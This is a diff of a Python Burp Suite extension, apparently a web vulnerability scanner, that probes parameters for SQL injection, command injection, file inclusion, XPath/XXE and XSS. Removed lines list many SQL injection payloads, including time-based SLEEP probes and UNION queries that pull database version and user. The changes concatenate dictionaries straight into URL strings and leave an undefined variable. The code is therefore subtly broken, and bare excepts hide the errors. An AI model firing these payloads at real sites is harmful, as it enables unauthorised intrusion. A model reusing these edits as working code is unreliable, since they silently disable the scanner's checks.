@@ -41,8 +41,6 @@ import requests
 import time
 from requests_toolbelt.utils import dump
 import os
-import BeautifulSoup
-
 import sys
 reload(sys)
 sys.setdefaultencoding("utf-8")
@@ -720,19 +718,18 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 dosya=urlparse.urlparse(url).path
 
 
-                encoded_args = urllib.urlencode(yenitime)
-                r = session.get(protocol+host+dosya+"?"+encoded_args,timeout=20)
+                r = session.get(protocol+host+dosya+"?"+yenitime,timeout=20)
                 data = dump.dump_all(r)
                 rawdata = data.decode('utf-8')
                 responsey = r.text
 
             except requests.exceptions.Timeout as errt:
 
-                self.ekle("GET",url,"Timebased SQL Injection", url+"\nPayload:"+encoded_args,rawdata+"\nTimeout")
+                self.ekle("GET",url,"Timebased SQL Injection", url+"\nPayload="+yenitime,rawdata+"\nTimeout")
 
             except socket.timeout:
 
-                self.ekle("GET",url,"Timebased SQL Injection", url+"\nPayload:"+encoded_args,rawdata+"\nTimeout")
+                self.ekle("GET",url,"Timebased SQL Injection", url+"\nPayload="+yenitime,rawdata+"\nTimeout")
 
             except:
                 mesaj="Error"
@@ -1067,16 +1064,15 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
                     rcehal={}
                     rcehal[key]=remotecommand
-                    rceparametre = urllib.urlencode(rcehal)
 
-                    urlac = session.get(url+"?"+rceparametre)
+                    urlac = session.get(url+"?"+rcehal)
 
                     data = dump.dump_all(urlac)
                     rawdata = data.decode('utf-8')
                     response = urlac.text
 
                     if "167734101" in response:
-                        self.ekle("GET",url,"Remote Command Execution",rceparametre, rawdata)
+                        self.ekle("GET",url,"Remote Command Execution",rcehal, rawdata)
 
             except:
                 mesaj="Error"
@@ -1095,8 +1091,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                     phpexechal={}
                     phpexechal[key]=sep
 
-                    phpexecparametre = urllib.urlencode(phpexechal)
-                    urlac = session.get(url+"?"+phpexecparametre)
+                    urlac = session.get(url+"?"+phpexechal)
                     data = dump.dump_all(urlac)
                     rawdata = data.decode('utf-8')
                     response = urlac.text
@@ -1123,15 +1118,14 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
                 for key,value in parse_qs(urlparse.urlparse(lfibul).query, True).items():
                     lfilihal[key]=lfidizin
-                    lfiparametre = urllib.urlencode(lfilihal)
 
                     try:
-                        r =session.get(protocol+host+dosya+"?"+lfiparametre)
+                        r =session.get(protocol+host+dosya+"?"+lfilihal)
                         response=r.text
                         if "0x9411111" in response or "0x94Scanner1111" in response:
                             data = dump.dump_all(r)
                             rawdata=data.decode('utf-8')
-                            self.ekle("GET", lfibul, "Local File Include Base64",protocol + host + dosya + "?" + lfiparametre, rawdata)
+                            self.ekle("GET", lfibul, "Local File Include Base64",protocol + host + dosya + "?" + lfilihal, rawdata)
                     except:
                         err="err"
 
@@ -1181,28 +1175,30 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 for key, value in params.items():
                     if key in postgetdict:
                         postgetdict[key] = value + xxedene
-
-                    parametre = urllib.urlencode(postgetdict)
+                    new_param = {}
+                    new_param =postgetdict.copy()
                     if method == "GET":
-                        f = session.get(url + "?" + parametre)
+                        f = session.get(url + "?" + postgetdict)
+                        response=f.text
+
                         data = dump.dump_all(f)
                         rawdata = data.decode('utf-8')
                     else:
                         f = session.post(url, parametre)
                         data = dump.dump_all(f)
                         rawdata = data.decode('utf-8')
-                    self.hatakontrol("POST", url, f.text, "")
-                    if "XPATH syntax error" in f.text or "XPathException" in f.text or \
-                            "System.Xml.XPath.XPathException" in f.text or \
-                            "Unknown error in XPath" in f.text or \
-                            "org.apache.xpath.XPath" in f.text or \
-                            "Cannot convert expression to a number" in f.text or \
-                            "Empty Path Expression" in f.text or \
-                            "4005 Notes error: Query is not understandable" in f.text or \
-                            "root:x:0:0:root" in f.text:
+                    self.hatakontrol("POST", url, response, url)
+                    if "XPATH syntax error" in response or "XPathException" in response or \
+                            "System.Xml.XPath.XPathException" in response or \
+                            "Unknown error in XPath" in response or \
+                            "org.apache.xpath.XPath" in response or \
+                            "Cannot convert expression to a number" in response or \
+                            "Empty Path Expression" in response or \
+                            "4005 Notes error: Query is not understandable" in response or \
+                            "root:x:0:0:root" in response:
                         self.ekle(method, url, "Xpath Injection", url + "DATA" + xxedene, rawdata)
 
-                    self.hatakontrol("XXE", url, f.text, url)
+                    self.hatakontrol("XXE", url, response, url)
 
             except:
                 mesaj = "fff"
@@ -1220,16 +1216,15 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 if key in postgetdict:
                     postgetdict[key] = value + "'"
 
-            parametre = urllib.urlencode(postgetdict)
             if method == "GET":
-                f = session.get(url + "?" + parametre)
+                f = session.get(url + "?" + postgetdict)
                 data = dump.dump_all(f)
                 rawdata = data.decode('utf-8')
             else:
-                f = session.post(url, parametre)
+                f = session.post(url, postgetdict)
                 data = dump.dump_all(f)
                 rawdata = data.decode('utf-8')
-            self.hatakontrol("GET", url, rawdata, "")
+            self.hatakontrol("GET", url, rawdata, url)
 
         except:
             mesaj = "fff"
@@ -1353,14 +1348,13 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                     for key,value in parse_qs(urlparse.urlparse(url).query, True).items():
                         cmdhal={}
                         cmdhal[key]=sep+safcmd
-                    cmdparametre = urllib.urlencode(cmdhal)
-                    urlac = session.get(url+"?"+cmdparametre)
+                    urlac = session.get(url+"?"+cmdhal)
                     response = urlac.text
                     cmdhal.clear()
                     data = dump.dump_all(urlac)
                     rawdata = data.decode('utf-8')
                     if "12345669" in response  or "16773409" in response:
-                        self.ekle("GET",url,"Command Injection",cmdparametre, rawdata)
+                        self.ekle("GET",url,"Command Injection",cmdhal, rawdata)
 
 
                 except:
@@ -1480,18 +1474,17 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
                 host=urlparse.urlparse(url).netloc
                 dosya=urlparse.urlparse(url).path
-                encoded_args = urllib.urlencode(yenitime)
-                responsex = session.get(protocol+host+dosya+"?"+encoded_args,timeout=20)
+                responsex = session.get(protocol+host+dosya+"?"+yenitime,timeout=20)
                 responsey = responsex.text
                 data = dump.dump_all(responsex)
                 rawdata = data.decode('utf-8')
-                self.hatakontrol("GET",url,rawdata,"xxx")
+                self.hatakontrol("GET",url,rawdata,url)
 
             except requests.exceptions.Timeout as errt:
-                self.ekle("GET",url,"Timebased SQL Injection",url+"\nPayload:"+timeler, "timeout")
+                self.ekle("GET",url,"Timebased SQL Injection",url+"\nPayload="+timeler, "timeout")
 
             except socket.timeout:
-                self.ekle("GET",url,"Timebased SQL Injection",url+timeler, "timeout")
+                self.ekle("GET",url,"Timebased SQL Injection",url+"\nPayload="+timeler, "timeout")
 
 
 
@@ -1510,8 +1503,8 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
     def vuln_check(self,URL):
         global TrueResponse
-        TrueResponse = int(self.request(URL + '%20AND%2043%20like%2043--+'))
-        FalseResponse = int(self.request(URL + '%20AND%2034%20like%2043--+'))
+        TrueResponse = int(self.requestim(URL + '%20AND%2043%20like%2043--+'))
+        FalseResponse = int(self.requestim(URL + '%20AND%2034%20like%2043--+'))
 
         if(TrueResponse != FalseResponse):
             return 'boolean'
@@ -1558,7 +1551,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                     response_headers = response1.info()
 
                     html1 = self.temizle(response1.read())
-                    self.hatakontrol("GET", urlblind, e.read(), urlblind + " BLIND SQL")
+                    self.hatakontrol("GET", urlblind, html1, urlblind + " BLIND SQL")
 
 
 
@@ -1573,7 +1566,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                     req2.add_header('Referer: ','http://'+urlblind)
                     response2 = urlopen(req2)
                     html2 = self.temizle(response2.read())
-                    self.hatakontrol("GET", urlblind, e.read(), urlblind + " BLIND SQL")
+                    self.hatakontrol("GET", urlblind, html2, urlblind + " BLIND SQL")
 
 
                 except:
@@ -1634,21 +1627,20 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 response = urlac.text
                 data = dump.dump_all(urlac)
                 rawdata = data.decode('utf-8')
-                if "Not Found" not in response:
-                    if "<script>alert(0x000123)" in response or \
-                                       "');alert(0x000123)" in response or \
-                       "<sCriPt>alert(0x000123)" in response or \
-                       "+alert(0x000123)+" in response or \
-                       "'%2Balert(0x000123)%2B'" in response or \
-                       "<BODY ONLOAD=alert(0x000123)>" in response or \
-                                       "<img Src=0x94 onerror=alert(0x000123)" in response:
-                        xssmi=self.xsscalisiomu(response)
-                        if xssmi==False:
-                            if "failed to open stream" not in response:
-                                self.ekle("GET",xssurl,"XSS",urlnormal, rawdata)
-                        else:
-                            if "failed to open stream" not in response:
-                                self.ekle("GET",xssurl,"XSS",urlnormal, rawdata)
+                if "<script>alert(0x000123)" in response or \
+                                   "');alert(0x000123)" in response or \
+                   "<sCriPt>alert(0x000123)" in response or \
+                   "+alert(0x000123)+" in response or \
+                   "'%2Balert(0x000123)%2B'" in response or \
+                   "<BODY ONLOAD=alert(0x000123)>" in response or \
+                                   "<img Src=0x94 onerror=alert(0x000123)" in response:
+                    xssmi=self.xsscalisiomu(response)
+                    if xssmi==False:
+                        if "failed to open stream" not in response:
+                            self.ekle("GET",xssurl,"XSS",urlnormal, rawdata)
+                    else:
+                        if "failed to open stream" not in response:
+                            self.ekle("GET",xssurl,"XSS",urlnormal, rawdata)
             except:
                 mesaj="asad"
 
@@ -1688,228 +1680,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 #yaz(mesaj)
 
 
-
-
-
-
-    def formyaz(self,url):
-
-        global postlarisuz
-
-        try:
-            protocol=urlparse.urlparse(url).scheme+"://"
-            toplamveri={}
-            html = session.get(url).text
-            soup = BeautifulSoup.BeautifulSoup(html)
-
-            forms=soup.findAll("form")
-            for form in forms:
-                if form.has_key('action'):
-                    if form['action'].find(protocol) == -1:
-
-                        if url.count("/")>=3:
-                            if url.count("/")==3:
-                                dizin=protocol+url.rsplit("/")[2]+"/"
-                            elif url.count("/")==4:
-                                dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"
-                            elif url.count("/")==5:
-                                dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"
-
-                            elif url.count("/")==6:
-                                dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"
-
-                            elif url.count("/")==7:
-                                dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"+url.rsplit("/")[6]+"/"
-
-                            elif url.count("/")==8:
-                                dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"+url.rsplit("/")[6]+"/"+url.rsplit("/")[7]+"/"
-
-                            elif url.count("/")==9:
-                                dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"+url.rsplit("/")[6]+"/"+url.rsplit("/")[7]+"/"+url.rsplit("/")[8]+"/"
-
-                            elif url.count("/")==10:
-                                dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"+url.rsplit("/")[6]+"/"+url.rsplit("/")[7]+"/"+url.rsplit("/")[8]+"/"+url.rsplit("/")[9]+"/"
-
-
-
-                            formurl=dizin + "/" + form['action'].strip('/')
-                            #print formurl
-                    else:
-                        formurl=url
-                        #print "action: " + formurl
-                else:
-                    formurl=url
-                    #print "action: " + formurl
-                if form.has_key('method') and form['method'].lower() == 'post':
-                    formurl=url
-                    #•yaz(" [#] [POST] Yeri action url : "+formurl,True)
-                    #print "[POST] action " +url
-                    for post_inputselect in form.findAll("select"):
-                        #print post_inputselect['name']
-                        toplamveri[post_inputselect['name']]=""
-
-                    for post_input in form.findAll("input"):
-                        if post_input.has_key('type'):
-                            if post_input['type'].lower() == 'file':
-                                a="[#] Upload "+formurl
-                                self.ekle("POST",formurl,"UPLOAD", "UPLOAD FORM","")
-
-                            if post_input['type'].lower() == 'text' or post_input['type'].lower() == 'password' or   post_input['type'].lower() == 'hidden' or post_input['type'].lower() == 'radio':
-                                if post_input.has_key('id'):
-                                    #print post_input['id']
-                                    if "user" in post_input['id'] or \
-                                                                           "username" in post_input['id'] or \
-                                       "password" in post_input['id'] or \
-                                       "pass" in post_input['id']:
-                                        self.ekle("POST",formurl,"LOGIN", "LOGIN FORM FOUND","")
-
-                                        a="[#] Login Sayfasi tespit Edildi "+formurl
-                                    if post_input.has_key('value'):
-                                        toplamveri[post_input['id']]=post_input['value']
-                                    else:
-                                        toplamveri[post_input['id']]=""
-                                elif post_input.has_key('name'):
-                                    if "user" in post_input['name'] or \
-                                                                           "username" in post_input['name'] or \
-                                       "password" in post_input['name'] or \
-                                       "pass" in post_input['name']:
-                                        a="[#] Login Sayfasi tespit Edildi "+formurl
-
-                                    #print post_input['name']
-                                    if post_input.has_key('value'):
-                                        toplamveri[post_input['name']]=post_input['value']
-                                    else:
-                                        toplamveri[post_input['name']]=""
-
-                        else:
-                            if post_input.has_key('value'):
-                                toplamveri[post_input['name']]=post_input['value']
-                            else:
-                                toplamveri[post_input['name']]=""
-
-                    for key in toplamveri.keys():
-                        if re.search("[\w\d]*mail[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="sifiriksdoksandort@hotmail.com"
-                        if re.search("[\w\d]*name[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="Danniel Leonardocu"
-                        if re.search("[\w\d]*date[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="02/08/2017"
-                        if re.search("[\w\d]*birth[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="09/01/1987"
-                        if re.search("[\w\d]*city[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="Washington"
-                        if re.search("[\w\d]*state[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="California"
-                        if re.search("[\w\d]*county[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="America"
-                        if re.search("[\w\d]*postal[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="93106"
-                        if re.search("[\w\d]*tel[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="05123456789"
-                        if re.search("[\w\d]*tel[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="05123456789"
-                        if re.search("[\w\d]*url[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="http://www.google.com"
-                        if re.search("[\w\d]*site[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="http://www.google.com"
-
-                    postyeah=""
-                    for key in toplamveri.iterkeys():
-                        postyeah+=key
-                    if postlarisuz.has_key(postyeah):
-                        mesaj="var"
-                    else:
-                        postlarisuz[postyeah]="0x94"
-
-                        self.tetikle(formurl, toplamveri,"POST")
-
-
-                if form.has_key('method') and form['method'].lower() == 'get' or not form.has_key('method'):
-                    #print "[GET] action " +formurl
-                    for get_inputselect in form.findAll("select"):
-                        if get_inputselect.has_key("name"):
-                            #print get_inputselect['name']
-                            toplamveri[get_inputselect['name']]=""
-
-
-                    for get_input in form.findAll("input"):
-                        if get_input.has_key('type'):
-                            if get_input['type'].lower() == 'text' or get_input['type'].lower() == 'password' or get_input['type'].lower() == 'hidden' or get_input['type'].lower() == 'radio':
-                                if get_input.has_key('id'):
-                                    #print get_input['id']
-                                    if "user" in get_input['id'] or \
-                                                                           "username" in get_input['id'] or \
-                                       "password" in get_input['id'] or \
-                                       "pass" in get_input['id']:
-                                        a="[#] Login Sayfasi tespit Edildi "+formurl
-
-                                    if post_input.has_key('value'):
-                                        toplamveri[post_input['id']]=post_input['value']
-                                    else:
-                                        toplamveri[post_input['id']]=""
-                                    toplamveri[post_input['id']]=""
-                                elif get_input.has_key('name'):
-                                    #print get_input['name']
-                                    if "user" in get_input['name'] or \
-                                                                           "username" in get_input['name'] or \
-                                       "password" in get_input['name'] or \
-                                       "pass" in get_input['name']:
-                                        a="login"
-                                    if get_input.has_key('value'):
-                                        toplamveri[get_input['name']]=get_input['value']
-                                    else:
-                                        toplamveri[get_input['name']]=""
-
-                        else:
-                            if get_input.has_key('value'):
-                                toplamveri[get_input['name']]=get_input['value']
-                            else:
-                                toplamveri[get_input['name']]=""
-
-
-                    for key in toplamveri.keys():
-                        if re.search("[\w\d]*mail[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="sifiriksdoksandort@hotmail.com"
-                        if re.search("[\w\d]*name[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="Danniel Leonardocu"
-                        if re.search("[\w\d]*date[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="02/03/2013"
-                        if re.search("[\w\d]*birth[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="09/01/1987"
-                        if re.search("[\w\d]*city[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="Washington"
-                        if re.search("[\w\d]*state[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="California"
-                        if re.search("[\w\d]*county[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="America"
-                        if re.search("[\w\d]*postal[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="93106"
-                        if re.search("[\w\d]*tel[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="05123456789"
-                        if re.search("[\w\d]*tel[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="05123456789"
-                        if re.search("[\w\d]*url[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="http://www.google.com"
-                        if re.search("[\w\d]*site[\w\d]*",key,re.DOTALL):
-                            toplamveri[key]="http://www.google.com"
-
-                    postyeah=""
-                    for key in toplamveri.iterkeys():
-                        postyeah+=key
-                    if postlarisuz.has_key(postyeah):
-                        mesaj="var"
-                    else:
-                        postlarisuz[postyeah]="0x94"
-                        self.tetikle(formurl, toplamveri,"GET")
-
-
-   
-        except:
-            mesaj="Bilinmeyen hata olustu\n"
-            #yaz(mesaj)
-
-
-
     def postget(self,url, params, method):
 
         postgetdict={}
@@ -1921,16 +1691,15 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 if key in postgetdict:
                     postgetdict[key]=value+"'"
 
-            parametre = urllib.urlencode(postgetdict)
             if method=="GET":
-                f = session.get(url+"?"+parametre)
+                f = session.get(url+"?"+postgetdict)
                 data = dump.dump_all(f)
                 rawdata = data.decode('utf-8')
             else:
-                f = session.post(url, parametre)
+                f = session.post(url, postgetdict)
                 data = dump.dump_all(f)
                 rawdata = data.decode('utf-8')
-            self.hatakontrol(method,url,rawdata,"")
+            self.hatakontrol(method,url,rawdata,"postget")
             postgetdict.clear()
             postgetdict = params.copy()
 
@@ -1953,17 +1722,16 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 if key in postgetdict:
                     postgetdict[key]=value+"'"
 
-                    parametre = urllib.urlencode(postgetdict)
                     if method=="GET":
-                        f = session.get(url+"?"+parametre)
+                        f = session.get(url+"?"+postgetdict)
                         data = dump.dump_all(f)
                         rawdata = data.decode('utf-8')
                     else:
-                        f = session.post(url, parametre)
+                        f = session.post(url, postgetdict)
                         data = dump.dump_all(f)
                         rawdata = data.decode('utf-8')
 
-                    self.hatakontrol(method,url,rawdata,"xxxx")
+                    self.hatakontrol(method,url,rawdata,"postgettek")
                     postgetdict.clear()
                     postgetdict=params.copy()
 
@@ -1976,227 +1744,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 
 
-    def blindpost(self,url,params,method):
-
-
-        try:
-            normaldict={}
-            for key,value in params.items():
-                if value=="":
-                    value="0x94"
-                normaldict[key]=value+"0x94"
-
-            parametresaf = urllib.urlencode(normaldict)
-            if method=="GET":
-                normalkaynak = self.temizle(session.get(url+"?"+parametresaf).text)
-            else:
-                normalkaynak = self.temizle(session.post(url, parametresaf).text)
-
-        except:
-            mesaj="Bilinmeyen hata olustu\n"
-
-
-        post_string	= [" 'aNd 1=1",
-                                      "' anD 1=1",
-                              "' and 1=(select 1)+'",
-                              "'+(SELECT 1)+'",
-                              "'+(SELECT 999999)+'",
-                              "' OR 'bk'='bk",
-                             "0x94' AND 'a'='a",
-                            "' select dbms_xmlgen.getxml('select \"a\" from sys.dual') from sys.dual;",
-                            "' select+dbms_pipe.receive_message((chr(95)||chr(96)||chr(97))+from+dual)",
-                              " SELECT CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)",
-                                "' SELECT CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)",
-                                "' or''='",
-                                "0x94 'or''='",
-                                "' and 1=1",
-                                "' and 1=1 'a'='a",
-                                "' and 1=1 'a'='a",
-                                "' aNd 1=2",
-                                "' aNd 1=MID((database()),1,1)>1",
-                                "' aNd 2=MID((@@version,1,1)--+",
-                                "' aNd 3=MID((@@version,1,1)--+",
-                                "' aNd 4=MID((@@version,1,1)--+",
-                                "' aNd 5=MID((@@version,1,1)--+",
-                                "' or 1=1 --",
-                                "a' or 1=1 --",
-                                "' or 1=1 #",
-                                "or 1=1 --",
-                                "') or ('x'='x",
-                                "or username LIKE '%a%",
-                                "' or username LIKE '%a%",
-                                "' HAVING 1=1--",
-                                "' and+1=convert(int,@@version)",
-                                "' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--",
-                                "'a' || 'b' ",
-                                "' SELECT IF(1=1,'true','false')",
-                                "') or ('1'='1--",
-                                "' GROUP BY 99999",
-                                "if(true=false,1,SLEEP(5))--+",
-                                "and+if(true%21=true,1,SLEEP(5))--+",
-                                "and+if(1=2,1,SLEEP(5))--+",
-                                "if(1%21=1,1,SLEEP(5))--+",
-                                "if(true=true,1,SLEEP(5))--+",
-                                "if(2=2,1,SLEEP(5))--+",
-                                "and+true=false--+",
-                                "and+false%21=false--+",
-                                "and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",
-                                "union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+",
-                                "' if(true=false,1,SLEEP(5))--+",
-                                "' and+if(true%21=true,1,SLEEP(5))--+",
-                                "' and+if(1=2,1,SLEEP(5))--+",
-                                "' if(1%21=1,1,SLEEP(5))--+",
-                                "' if(true=true,1,SLEEP(5))--+",
-                                "' if(2=2,1,SLEEP(5))--+",
-                                "' and+true=false--+",
-                                "' and+false%21=false--+",
-                                "' and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",
-                                "' union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+"]
-
-        bitiskarakter=[""]
-
-
-        #true_strings=["' OR 'bk'='bk"]
-        #false_strings=["' OR 'bk'='bk1111"]
-
-        true_strings = ["' or 1=1",
-                                "')'a'='a'",
-                        "')'a'='a",
-                        "'or 'a'='a'",
-                        "0x94' AND 'a'='a",
-                        "' OR 'bk'='bk",
-                       "' and 1=(select 1)+'",
-                      "' aNd 1=1",
-                      " and 1=1",
-                        " ' and 1=1",
-                        " and 'a'='a",
-                        "' and 'a'='a",
-                        "' and 'a'='a",
-                        " and 1 like 1",
-                        " and 1 like 1",
-                        " and 1=1--",
-                        " group by 1",
-                        "'+(SELECT 1)+'",
-                        "' and 1=(select 1)+'",
-                        "'+aNd+10>1"]
-
-        false_strings =["' or 1=2",
-                                "')'a'='b'",
-                        "')'a'='b",
-                        "'or 'a'='b'",
-                        "0x94' AND 'a'='b",
-                        "' OR 'bk'='0x94",
-                       "' and 1=(select 999999)+'",
-                      "' aNd 1=2",
-                      " and 1=2",
-                        " ' and 1=2",
-                        " and 'a'='b",
-                        "' and 'a'='b",
-                        "' and 'a'='b",
-                        " and 1 like 2",
-                        " and 1 like 2",
-                        " and 1=2--",
-                        " group by 99999",
-                        "'+(SELECT 99999)+'",
-                        "' and 1=(select 2)+'",
-                        "'+aNd+10>20"]
-
-
-        for sonkarakter in bitiskarakter:
-
-
-            for iyy in range(len(true_strings)):
-
-                normaldict={}
-                truedict={}
-                falsedict={}
-                normaldict=params.copy()
-                truedict=params.copy()
-                falsedict=params.copy()
-
-
-
-
-                for key,value in params.items():
-                    if key not in ignoreparametre:
-                        normalkaynak=""
-                        if key in normaldict:
-                            if value=="":
-                                value="0x94"
-                            normaldict[key]=value+sonkarakter
-                            try:
-
-                                parametresafn = urllib.urlencode(normaldict)
-                                if method=="GET":
-                                    normalkaynak = self.temizle(session.get(url+"?"+parametresafn).text)
-
-                                    normaldict.clear()
-                                    normaldict=params.copy()
-                                else:
-
-                                    normalkaynak = self.temizle(session.post(url, parametresafn).text)
-                                    normaldict.clear()
-                                    normaldict=params.copy()
-
-
-                            except:
-                                mesaj="afaf"
-                    #-----------------------------------------------------------------------------------
-                        if key in truedict:
-                            if value=="":
-                                value="0x94"
-                            truedict[key]=value+true_strings[iyy]+sonkarakter
-                            try:
-                                parametresaft = urllib.urlencode(truedict)
-                                if method=="GET":
-                                    truekaynak = self.temizle(session.get(url+"?"+parametresaft).text)
-                                    truedict.clear()
-                                    truedict=params.copy()
-                                else:
-                                    truekaynak = self.temizle(session.post(url, parametresaft).text)
-                                    truedict.clear()
-                                    truedict=params.copy()
-                                self.hatakontrol(method,url,truekaynak,method+" "+url)
-
-
-
-
-
-                            except:
-                                mesaj="fffn"
-
-
-                        if key in falsedict:
-
-                            if value=="":
-                                value="0x94"
-                            falsedict[key]=value+false_strings[iyy]+sonkarakter
-                            try:
-                                parametresaff = urllib.urlencode(falsedict)
-                                if method=="GET":
-                                    falsekaynak = self.temizle(session.get(url+"?"+parametresaff).text)
-
-                                    falsedict.clear()
-                                    falsedict=params.copy()
-                                else:
-                                    falsekaynak = self.temizle(session.post(url, parametresaff).text)
-                                    falsedict.clear()
-                                    falsedict=params.copy()
-
-                                self.hatakontrol(method,url,falsekaynak,method+" SQL INJECTION "+url+"\n Yollanan Veri="+parametresaff)
-#xxxxxxxxxxxxx
-
-
-
-
-                            except:
-                                mesaj="jjjj"
-
-                            if normalkaynak==falsekaynak:
-                                if truekaynak!=falsekaynak:
-                                    if len(truekaynak)!=len(falsekaynak):
-                                        self.blindpostonay(url,params,method)
-                                        debug=1
 
 
 
@@ -2283,31 +1830,32 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
             for key,value in params.items():
                 if key in postgetdict:
                     postgetdict[key]=value+timeler
+                    new_param = {}
+                    new_param = postgetdict.copy()
                     try:
-                        parametresaf = urllib.urlencode(postgetdict)
                         if method=="GET":
-                            y11 = session.get(url+"?"+parametresaf,timeout=15)
+                            y11 = session.get(url+"?"+postgetdict,timeout=15)
                             postgetdict.clear()
                             postgetdict=params.copy()
                             data = dump.dump_all(y11)
                             rawdata = data.decode('utf-8')
 
                         else:
-                            y11 = session.post(url, parametresaf,timeout=15)
+                            y11 = session.post(url, postgetdict,timeout=15)
 
                             postgetdict.clear()
                             postgetdict=params.copy()
                             data = dump.dump_all(y11)
                             rawdata = data.decode('utf-8')
-                        self.hatakontrol(method,url,rawdata,"")
+                        self.hatakontrol(method,url,rawdata,url)
 
 
                     except requests.exceptions.Timeout as errt:
-                        self.ekle(method,url,"Timebased SQL Injection",url+parametresaf, rawdata)
+                        self.ekle(method,url,"Timebased SQL Injection",url+"\nPayload="+str(new_param), "Timeout")
 
 
                     except socket.timeout:
-                        self.ekle(method,url,"Timebased SQL Injection",url+parametresaf, rawdata)
+                        self.ekle(method,url,"Timebased SQL Injection",url+"\nPayload="+str(new_param), "Timeout")
 
 
                     except:
@@ -2335,24 +1883,25 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
                 for key,value in params.items():
                     if key in postgetdict:
                         postgetdict[key]=value+sep+pcmd
+                        new_param = {}
+                        new_param = postgetdict.copy()
                         try:
-                            parametresaf = urllib.urlencode(postgetdict)
                             if method=="GET":
-                                y11 = session.get(url+"?"+parametresaf,timeout=20)
+                                y11 = session.get(url+"?"+postgetdict,timeout=20)
                                 postgetdict.clear()
                                 postgetdict=params.copy()
                                 data = dump.dump_all(y11)
                                 rawdata = data.decode('utf-8')
 
                             else:
-                                y11 = session.post(url, parametresaf,timeout=20)
+                                y11 = session.post(url, postgetdict,timeout=20)
                                 postgetdict.clear()
